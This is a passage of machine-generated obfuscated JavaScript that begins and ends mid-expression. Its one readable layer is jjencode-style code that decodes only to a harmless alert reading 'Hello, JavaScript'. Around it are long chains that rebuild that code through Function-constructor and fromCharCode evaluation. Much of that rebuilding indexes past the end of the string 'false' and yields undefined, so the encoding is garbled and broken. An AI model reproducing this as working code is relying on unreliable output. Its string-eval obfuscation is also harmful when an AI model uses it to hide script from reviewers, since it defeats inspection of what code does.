String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[13]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+([false]+"")[14]+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[13]+([false]+"")[14]+([false]+"")[14]+([false]+"")[14]+([false]+"")[12]
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"(\\\"\\"+$.__$+$.__$+$.___+$.$$$_+(![]+"")[$._$_]+(![]+"")[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$._$_+$.$_$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"\\"+$.__$+$._$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\\"\\"+$.$__+$.___+")"+"\"")())();
[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(126)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[15]+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+([false]+"")[15]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+([false]+"")[15]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+([false]+"")[14]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return 